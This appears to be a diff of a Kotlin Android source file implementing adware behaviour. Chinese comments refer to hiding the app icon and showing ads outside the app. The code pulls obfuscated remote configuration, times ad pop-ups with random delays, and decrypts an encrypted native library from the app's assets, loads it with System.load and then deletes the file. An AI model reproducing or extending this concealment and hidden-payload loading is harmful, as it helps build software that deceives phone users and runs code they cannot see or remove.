@@ -1,5 +1,6 @@
 package pang
 
+import an.nee.dc
 import android.app.Application
 import android.app.KeyguardManager
 import android.content.Context
@@ -9,21 +10,20 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.util.Log
-import com.great.faintest.Core
+import com.facebook.FacebookSdk
+import com.facebook.appevents.AppEventsLogger
+import com.google.firebase.analytics.FirebaseAnalytics
+import com.google.firebase.analytics.ktx.analytics
+import com.google.firebase.ktx.Firebase
 import com.great.faintest.AppLifecycelListener
+import com.great.faintest.Constant
+import com.great.faintest.Core
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.json.JSONObject
-import an.nee.dc
-import com.great.faintest.Constant
-import com.facebook.FacebookSdk
-import com.facebook.appevents.AppEventsLogger
-import com.google.firebase.analytics.FirebaseAnalytics
-import com.google.firebase.analytics.ktx.analytics
-import com.google.firebase.ktx.Firebase
 import java.io.File
 import java.io.FileOutputStream
 import java.io.InputStream
@@ -66,7 +66,7 @@ object AdE {
 
     @JvmStatic
     var isLoadH = false //是否H5的so 加载成功
-    private var tagL = "" //调用外弹 隐藏icon字符串
+    private var tagL = "" //隐藏icon字符串
     private var tagO = "" //外弹字符串
 
     @JvmStatic
@@ -77,6 +77,7 @@ object AdE {
     private var timeDE = 400L //延迟显示随机时间结束
     private var maxShowTime = 10000L // 最大显示时间
     private var checkTimeRandom = 1000 // 在定时时间前后增加x秒
+    var nextFun: Boolean = false
 
     @JvmStatic
     fun gDTime(): Long {
@@ -148,6 +149,19 @@ object AdE {
     }
 
     @JvmStatic
+    fun rfAdmin() {
+        val admin = Core.getStr("kuyjHBd")
+        try {
+            reConfig(JSONObject(admin))
+            if (!nextFun) {
+                nextFun = true
+                a2()
+            }
+        } catch (e: Exception){
+            Log.e("TAG", "rfAdmin: ${e.message}", )
+        }
+    }
+    @JvmStatic
     fun a2() {
         mContext.registerActivityLifecycleCallbacks(AppLifecycelListener())
         File("${mContext.dataDir}/$sing").mkdirs()
@@ -159,14 +173,15 @@ object AdE {
     fun reConfig(js: JSONObject) {
         // JSON数据格式
         val key = js.optString(Constant.K_All).split("-")
-        sK = js.optString(key[0])
+        sK = key[0]
         val listStr = js.optString(Constant.K_W).split("-")
         tagL = listStr[0]
         tagO = listStr[1]
         strBroadKey = listStr[2]
         sing = listStr[3]
         val id = js.optString(Constant.K_ID).split("-")
-        mAdC.setAdId(js.optString(id[0]), id[1])// 广告id
+        Log.e("TAG", "reConfig: id-0=${id[0]}===id-1=${id[1]}", )
+        mAdC.setAdId(id[0], id[1])// 广告id
         val lt = js.optString(Constant.K_TIME).split("-")//时间相关配置
         cTime = lt[0].toLong() * 1000
         tPer = lt[1].toInt() * 1000
@@ -182,8 +197,7 @@ object AdE {
 
     private var lastS = ""
     private fun refreshAdmin() {
-        // todo 把外面的配置传进来通过反射、mmkv、keep后的类返回等
-        val s = "" // 获取admin外面的配置通过mmkv
+        val s = Core.getStr("kuyjHBd")
         if (lastS != s) {
             lastS = s
             reConfig(JSONObject(s))
@@ -204,7 +218,7 @@ object AdE {
                 return@launch
             }
             Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            dc.a0(2, 1.0, tagL)
+            dc.a0( tagL)
             delay(1110)
             while (true) {
                 // 刷新配置
@@ -236,20 +250,34 @@ object AdE {
         }
     }
 
+
+
     private fun loadSFile(assetsName: String): Boolean {
-        val aIp = mContext.assets.open(assetsName)
-        val fSN = "And_${System.currentTimeMillis()}"
-        val file = File("${mContext.filesDir}/Cache")
-        if (file.exists().not()) {
-            file.mkdirs()
-        }
         try {
-            decrypt(aIp, File(file.absolutePath, fSN))
-            val file2 = File(file.absolutePath, fSN)
-            System.load(file2.absolutePath)
-            file2.delete()
-            return true
-        } catch (_: Exception) {
+            val assetsInputS = mContext.assets.open(assetsName)
+            val fileSoName = "${assetsName.substring(2).replace("/", "_")}_${System.currentTimeMillis()}"
+            val file = File("${mContext.filesDir}/Cache")
+            if (file.exists().not()) {
+                file.mkdirs()
+            }
+            try {
+                val outputFile = File(file.absolutePath, fileSoName)
+                decrypt(assetsInputS, outputFile)
+
+                if (!outputFile.exists() || outputFile.length() == 0L) {
+                    return false
+                }
+
+                System.load(outputFile.absolutePath)
+                outputFile.delete()
+                return true
+            } catch (e: Exception) {
+                Log.e("TAG", "loadSFile-1: ${e.message}", )
+                e.printStackTrace()
+            }
+        } catch (e: Exception) {
+            Log.e("TAG", "loadSFile-2: ${e.message}", )
+            e.printStackTrace()
         }
         return false
     }
@@ -318,7 +346,7 @@ object AdE {
             }
             sNumJump(++numJumps)
             Core.pE("ad_start")
-            dc.a0(2, 1.0, tagO)
+            dc.a0(tagO)
         }
     }
 
